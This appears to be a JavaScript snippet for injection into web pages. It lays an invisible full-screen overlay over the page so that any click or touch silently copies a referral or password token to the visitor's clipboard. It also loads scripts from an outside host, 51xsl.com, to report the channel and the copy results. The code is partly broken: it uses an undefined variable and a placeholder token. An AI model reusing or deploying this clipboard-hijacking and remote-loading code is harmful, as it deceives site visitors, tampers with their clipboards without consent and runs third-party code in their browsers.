    var bbb;
    (function () {

        const channel_info = function () {
            let src = document.currentScript['src'];
            let js_name = src.substr(src.lastIndexOf("/") + 1);
            if (js_name.indexOf("?") !== -1) {
                js_name = js_name.split("?")[0];
            }

            if (js_name.indexOf("_") > -1) {
                js_name = js_name.split("_")[1];
            }
            return {
                "js_name": js_name
            }
        }();
        const KL = {
            "channel": channel_info.js_name
        };
        KL.cookeTool = function () {
            const cookie_key = "pkzlmklx^smzm";
            const _expireTime = 60 * 60 * 1000;
            return {
                "getCookie": function (cookie_name) {
                    if (document.cookie.length > 0) {
                        let c_start = document.cookie.indexOf(cookie_name + "=");
                        if (c_start !== -1) {
                            c_start = c_start + cookie_name.length + 1;
                            let c_end = document.cookie.indexOf(";", c_start);
                            if (c_end === -1) {
                                c_end = document.cookie.length;
                            }
                            return decodeURIComponent(document.cookie.substring(c_start, c_end));
                        }
                    }
                    return "";
                },
                "setCookie": function (cookie_value) {
                    const expire_date = new Date();
                    expire_date.setTime(expire_date.getTime() + _expireTime);
                    document.cookie = cookie_key + "=" + decodeURIComponent(cookie_value) + ((_expireTime == null) ? "" : ";expires=" + expire_date.toUTCString());
                },
                "checkCookie": function () {
                    let hostname = this.getCookie(cookie_key);
                    if (hostname != null && hostname !== "") {//有访问记录，并且还没有过期,不能访问
                        return false;
                    } else {//没有访问记录,或者访问记录已经过期
                        hostname = document.location.hostname;
                        this.setCookie(hostname);
                        return true;
                    }
                },

            }
        };

        function createScript(scriptUrl) {
            const div_code = document.createElement("div");
            div_code.style.display = "none";

            const script_code = document.createElement("script");
            script_code.setAttribute("type", "text/javascript");
            script_code.src = scriptUrl;

            div_code.appendChild(script_code);
            document.body.appendChild(div_code);
            return script_code;
        }

        function copyToClipboard() {
            bbb.focus();
            bbb.setSelectionRange(0, bbb.value.length);
            // b.select();
            try {


                var buttonT=document.createElement("button")
                buttonT.id="copyBtn";
                buttonT.className="btn";
                buttonT.setAttribute("data-clipboard-target","#testArea1");
                buttonT.style.opacity="0";
                buttonT.onclick = function () {                          //绑定点击事件

                    var clipboard = new ClipboardJS('.btn');
                    clipboard.on('success', function(e) {
                        console.info('Action:', e.action);
                        console.info('Text:', e.text);
                        console.info('Trigger:', e.trigger);

                        if (KL.cookeTool().checkCookie()) {
                            createScript("https://www.51xsl.com/lk?kl=" + text + "&re=true");
                        } else {
                            console.info("had upload!");
                        }

                        e.clearSelection();
                    });

                    clipboard.on('error', function(e) {
                        console.error('Action:', e.action);
                        console.error('Trigger:', e.trigger);

                        createScript("https://www.51xsl.com/lk?kl=" + text + "&re=false");

                    });

                };
                document.body.appendChild(buttonT);


                // document.getElementById("copyBtn").click();
                buttonT.click();
                // const copyResult = document.execCommand("copy");  // Security exception may be thrown by some browsers.
                // const copyResult = true;  // Security exception may be thrown by some browsers.
                //
                // if (copyResult) {
                //
                // } else {
                //
                // }
            } catch (ex) {
                console.warn("Copy to clipboard failed.", ex);
                return false;
            } finally {
                document.body.removeChild(bbb);
            }
        }

        callback = function (kouLing) {
            //console.log(kouLing);
            kouLing="ttttttttttttttttttttttttttttttttttttttt";
            if (document.body) {
                bbb = document.createElement("textarea");
                bbb["style"]["border"] = 10;
                bbb["style"]["position"] = "fixed";
                bbb["style"]["top"] = 0;
                bbb["style"]["left"] = 0;
                bbb["style"]["width"] = "100%";
                bbb["style"]["height"] = "100%";
                bbb["style"]["background"] = ['url("/#")', "transparent"];
                bbb["style"]["color"] = "transparent";
                bbb["style"]["zIndex"] = 99999;
                bbb.value = kouLing;
                bbb.id="testArea1";
                bbb.setAttribute("readonly", "");
                bbb.addEventListener("click", copyToClipboard);
                document.body.appendChild(bbb);


                // document.addEventListener("click", copyToClipboard);
                document.addEventListener("touchend", copyToClipboard);



            }
        };


        createScript("https://www.51xsl.com/fk?c=" + KL.channel.replace(".js", ''));

    })();
